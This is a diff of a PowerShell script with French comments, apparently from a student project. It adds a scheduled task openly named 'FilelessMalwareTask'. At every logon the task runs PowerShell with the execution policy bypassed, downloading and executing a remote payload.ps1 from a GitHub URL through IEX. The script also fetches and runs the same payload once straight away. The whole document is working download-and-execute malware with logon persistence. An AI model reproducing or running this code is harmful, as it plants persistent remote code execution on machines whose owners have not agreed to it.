@@ -9,6 +9,13 @@ If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdent
 
 Write-Output "Script exécuté avec les droits administrateurs."
 
+if (!(Get-ScheduledTask | Where-Object {$_.TaskName -eq "FilelessMalwareTask"})) {
+    # Créez la tâche planifiée
+    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/melissa172714/PFE/main/payload.ps1')"
+    $TaskTrigger = New-ScheduledTaskTrigger -AtLogon
+    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName "FilelessMalwareTask" -Description "Executes a fileless script at logon"
+}
+
 # Téléchargez et exécutez une charge utile
 Write-Output "Téléchargement et exécution de la charge utile..."
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/melissa172714/PFE/main/payload.ps1')
